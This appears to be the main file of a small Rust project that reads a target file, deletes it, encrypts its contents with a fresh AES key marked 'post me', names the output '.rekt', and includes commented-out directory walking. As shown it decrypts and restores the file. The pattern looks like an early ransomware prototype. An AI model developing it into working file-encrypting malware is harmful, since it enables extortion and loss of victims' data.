extern crate rusto;

use rusto::basic_symm;
use rusto::directory_reading;
use rusto::aes;
use rusto::file_handling;
use std::path::Path;

fn main() {
    // let run_encrypt = false;
    // if run_encrypt {
    //     {
    //         let file_name = "blah.txt".to_string();
    //         let encrypted_name = "rip".to_string();
    //         let file_password = "iloveyou".to_string();
    //         basic_symm::encrypt_file(file_name, encrypted_name, file_password);
    //     }
    //
    //     {
    //         let encrypted_file_name = "rip".to_string();
    //         let decrypted_file_name = "blah".to_string();
    //         let password = "iloveyou".to_string();
    //
    //         basic_symm::decrypt_file(encrypted_file_name, password, decrypted_file_name);
    //     }
    // }
    // let path = ".";
    // directory_reading::read_directory(path.to_string());
    //
    // let real_path = Path::new(".");
    //
    // directory_reading::visit_dirs(real_path);

    //let data = "Memes 4 dreams";

    let path = "encrypt_me/blah.txt";
    // I'm now in memory
    let file_contents = file_handling::read_file(path.to_string()).unwrap();
    println!("Data: {:?}", file_contents);
    //directory_reading::read_directory(path.to_string());

    file_handling::remove_file(path.to_string());

    let key = aes::GenerateKey(); // post me
    let nonce = aes::GenerateNonce(); // post me

    let encrypted_data = aes::AESCipher(file_contents.as_bytes(), &key, &nonce).ok().unwrap();
    let encrypted_path = "encrypt_me/blah.rekt";
    // file_handling::write_file(encrypted_path.to_string(), &encrypted_data);

    let decrypted_data = aes::AESDecrypt(&encrypted_data[..], &key, &nonce).ok().unwrap();
    let decrypted_path = "encrypt_me/blah.txt";
    file_handling::write_file(decrypted_path.to_string(), &decrypted_data);
    file_handling::remove_file(encrypted_path.to_string());

}
